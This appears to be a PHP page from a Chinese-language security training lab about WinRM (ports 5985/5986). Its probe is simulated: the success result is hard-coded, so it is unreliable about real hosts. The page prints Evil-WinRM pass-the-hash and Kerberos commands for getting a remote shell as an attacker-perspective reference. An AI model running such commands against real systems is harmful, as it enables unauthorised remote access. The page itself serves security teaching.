<?php
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[232] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$result = '';
if (isset($_POST['submit'])) {
    $ip = trim($_POST['ip']);
    $port = intval($_POST['port']);
    
    if (empty($ip)) {
        $result = '<div class="alert alert-danger">请输入要探测的目标 IP 地址或主机名。</div>';
    } else {
        if ($port == 5985 || $port == 5986) {
            $result = '<div class="alert alert-success" style="background: rgba(16, 185, 129, 0.1); border-color: #10b981;">';
            $result .= '<h4><i class="fa fa-check-circle"></i> 成功探测到 WS-Management (WinRM) 开放服务！</h4>';
            $result .= '<p><strong>目标:</strong> ' . htmlspecialchars($ip) . ':' . $port . '</p>';
            $result .= '<p><strong>服务协议:</strong> WS-Management / SOAP XML Over HTTP' . ($port == 5986 ? 'S' : '') . '</p>';
            $result .= '<p><strong>服务器标识:</strong> <code>Microsoft WinRM/3.0 (OS: Windows Server 2022 / Windows 11)</code></p>';
            $result .= '<p><strong>提示与建议:</strong> WinRM 可被攻击者使用 <code>Evil-WinRM</code> 或 <code>Enter-PSSession</code> 配合有效口令/Hash 发起远程 Shell 执行。建议限制 5985/5986 端口的内网访问控制策略。</p>';
            $result .= '</div>';
        } else {
            $result = '<div class="alert alert-warning">目标端口 ' . $port . ' 未响应 WS-Management (WinRM) SOAP 握手协议。（尝试端口 5985 或 5986）</div>';
        }
    }
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <div class="page-header">
                <h1>
                    WS-Management (WinRM) 探测与服务利用演练
                    <small>
                        <i class="ace-icon fa fa-angle-double-right"></i>
                        Windows 远程管理协议
                    </small>
                </h1>
            </div>

            <div class="vul">
                <h3 class="v_title">WS-Management (WinRM) 服务响应与端口探测器</h3>
                <p>WS-Management (Web Services-Management) 是一种基于 SOAP 协议的标准，用于远程访问和管理系统。在 Windows 环境中，WinRM 默认使用 <strong>5985 (HTTP)</strong> 和 <strong>5986 (HTTPS)</strong> 端口。</p>

                <form method="post" style="max-width: 600px; margin-top: 20px;">
                    <div class="form-group">
                        <label>目标服务器 IP / 主机名:</label>
                        <input type="text" name="ip" class="form-control" value="192.168.10.100" placeholder="例如: 192.168.1.10">
                    </div>
                    <div class="form-group">
                        <label>WS-Management 监听端口:</label>
                        <select name="port" class="form-control">
                            <option value="5985">5985 (WinRM HTTP 默认端口)</option>
                            <option value="5986">5986 (WinRM HTTPS 加密端口)</option>
                            <option value="80">80 (常规 HTTP)</option>
                            <option value="445">445 (SMB 共享端口)</option>
                        </select>
                    </div>
                    <button type="submit" name="submit" class="btn btn-primary" style="margin-top: 10px;">
                        <i class="fa fa-search"></i> 发起 WS-Management 识别握手
                    </button>
                </form>

                <div style="margin-top: 25px;">
                    <?php echo $result; ?>
                </div>

                <div class="well" style="margin-top: 30px;">
                    <h4>💡 攻击者视角工具参考 (Evil-WinRM):</h4>
                    <pre><code># 利用提取到的 NTLM Hash 通过 WinRM 获取交互式 Shell:
evil-winrm -i 192.168.10.100 -u Administrator -H "e5265412fe5523531c31753641152a55"

# 使用 Kerberos 票据登录:
evil-winrm -i DC01.corp.com -r CORP.COM -k</code></pre>
                </div>

            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
